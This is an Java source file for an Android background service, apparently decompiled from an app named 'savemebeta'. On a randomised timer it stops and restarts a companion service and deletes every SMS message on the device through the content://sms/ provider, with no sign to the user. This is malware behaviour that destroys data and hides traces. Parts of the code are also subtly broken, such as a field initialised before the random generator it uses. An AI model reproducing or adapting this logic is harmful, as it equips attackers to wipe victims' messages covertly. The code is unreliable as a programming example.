package com.savemebeta;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnTouchListener;
import android.widget.Toast;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

public class restartSCHK extends Service implements OnTouchListener {
    int i1 = (this.r.nextInt(10001) + 30000);
    Random r = new Random();

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        stopService(new Intent(this, SCHKMS.class));
        new Timer().schedule(new TimerTask() {
            public void run() {
                new Timer().schedule(new TimerTask() {
                    public void run() {
                        Cursor c = restartSCHK.this.getApplicationContext().getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);
                        while (c.moveToNext()) {
                            try {
                                restartSCHK.this.getApplicationContext().getContentResolver().delete(Uri.parse("content://sms/" + c.getInt(0)), null, null);
                            } catch (Exception e) {
                                Log.e(toString(), "Error deleting sms", e);
                            } finally {
                                c.close();
                            }
                        }
                    }
                }, 1000);
                restartSCHK.this.startService(new Intent(restartSCHK.this, SCHKMS.class));
                restartSCHK.this.stopSelf();
                restartSCHK.this.stopSelf();
            }
        }, (long) this.i1);
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public boolean onTouch(View v, MotionEvent event) {
        Toast.makeText(this, "REQUEST event", 0).show();
        return false;
    }
}
